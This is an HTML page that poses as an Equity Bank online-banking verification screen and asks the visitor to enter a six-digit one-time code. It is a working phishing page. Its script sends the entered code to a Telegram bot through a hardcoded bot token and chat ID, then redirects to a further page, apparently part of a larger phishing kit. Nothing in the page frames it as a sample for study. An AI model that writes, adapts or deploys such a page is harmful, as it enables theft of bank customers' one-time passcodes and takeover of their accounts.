<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        @media (min-width: 768px) {
            body {
                flex-direction: row;
            }
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 40px;
            color: white;
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"] {
            width: 30px;
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            text-align: center;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        
        @media (max-width: 768px) {
            .left-section,
            .right-section {
                padding: 20px;
            }
            .login-form {
                padding: 15px;
            }
        }
    </style>
</head>

<body>

    <div class="left-section">
        <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
        <h1>Equity</h1>
        <h2>Welcome to Equity online</h2>
        <p>More than just banking.</p>
    </div>

    <div class="right-section">
        <div class="login-form">
            <h2>Verify</h2>
            <p>We have sent a verification code to your email/phone</p>
            <p>Please enter the code below:</p>

            <div class="form-group">
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
            </div>

            <button id="verify-button">Verify</button>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('.form-group input');

        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
        });

        document.getElementById('verify-button').addEventListener('click', function() {
            let allFilled = true;
            let otpCode = '';

            inputs.forEach(input => {
                if (input.value.trim() === '') {
                    allFilled = false;
                } else {
                    otpCode += input.value.trim();
                }
            });

            if (allFilled) {
                sendOTPToTelegram(otpCode);
            } else {
                alert("Please enter the complete verification code.");
            }
        });

        function sendOTPToTelegram(otp) {
            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
            const chatId = '5615316142';
            const message = `OTP Code: ${otp}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                })
                .then(response => {
                    if (response.ok) {
                        window.location.href = "equity4.html";
                    } else {
                        alert('Error sending OTP to Telegram.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error sending OTP to Telegram.');
                });
        }
    </script>

</body>

</html>
